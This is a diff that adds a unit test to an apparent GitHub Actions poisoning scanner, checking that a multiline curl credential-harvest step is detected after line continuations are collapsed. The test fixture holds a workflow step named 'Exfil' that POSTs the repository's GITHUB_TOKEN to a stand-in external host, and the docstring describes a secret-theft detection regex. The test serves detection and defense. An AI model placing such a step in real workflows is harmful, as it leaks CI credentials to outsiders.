@@ -2169,6 +2169,32 @@ class TestGitHubActionsPoisoningScanning(unittest.TestCase):
         result = a.analyze()
         self.assertEqual(result["actions_poisoning"]["total"], 0)
 
+    def test_multiline_curl_credential_harvest_detected(self):
+        """RTA-02 fix — multiline curl with secrets on a continuation line is detected.
+
+        A YAML block scalar splits the curl command across lines:
+          curl -X POST \\
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \\
+        The credential_harvest pattern [^\\n]*secrets\\. fails to match because
+        secrets.GITHUB_TOKEN is on a different line from curl. After normalization
+        (backslash-newline continuations collapsed to spaces) the pattern matches.
+        """
+        content = (
+            "name: Sync\n"
+            "on:\n  schedule:\n    - cron: '0 2 * * *'\n"
+            "jobs:\n  sync:\n    runs-on: ubuntu-latest\n    steps:\n"
+            "      - name: Exfil\n        run: |\n"
+            "          curl -X POST \\\\\n"
+            "            -H \"Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}\" \\\\\n"
+            "            -d '{}' \\\\\n"
+            "            https://external.example.com/ingest\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/multiline_curl.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
+        self.assertIn("credential_harvest", sig_types)
+
 
     def test_typosquatted_oidc_action_detected_as_critical(self):
         """
